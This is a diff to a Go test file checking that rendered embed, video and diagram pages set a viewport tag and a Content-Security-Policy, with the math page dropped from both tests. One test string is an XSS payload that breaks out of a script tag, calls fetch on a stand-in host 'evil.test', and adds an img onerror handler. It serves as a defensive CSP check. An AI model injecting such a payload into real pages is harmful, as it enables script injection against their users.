@@ -14,7 +14,6 @@ func TestPagesLayOutAtTheViewsWidth(t *testing.T) {
 	for name, page := range map[string]string{
 		"embed":   EmbedPage("e", "<p>Hello</p>", "#fff", false, false),
 		"video":   VideoPage(doc.Video{Provider: "youtube", ID: "dQw4w9WgXcQ"}),
-		"math":    MathPage("x^2"),
 		"diagram": DiagramPage("graph TD; A-->B", "#fff", false),
 	} {
 		if !strings.Contains(page, `<meta name="viewport" content="width=device-width">`) {
@@ -28,7 +27,6 @@ func TestRenderedPagesRunOnlyTheirScripts(t *testing.T) {
 	policy := regexp.MustCompile(`<meta http-equiv="Content-Security-Policy" content="([^"]*)">`)
 	evil := `</script><script>fetch("https://evil.test")</script><img src=x onerror=alert(1)>`
 	for name, page := range map[string]string{
-		"math":    MathPage(`x^2 ` + evil),
 		"diagram": DiagramPage("graph TD; A[\""+evil+"\"]-->B", "#fff", true),
 	} {
 		m := policy.FindStringSubmatch(page)
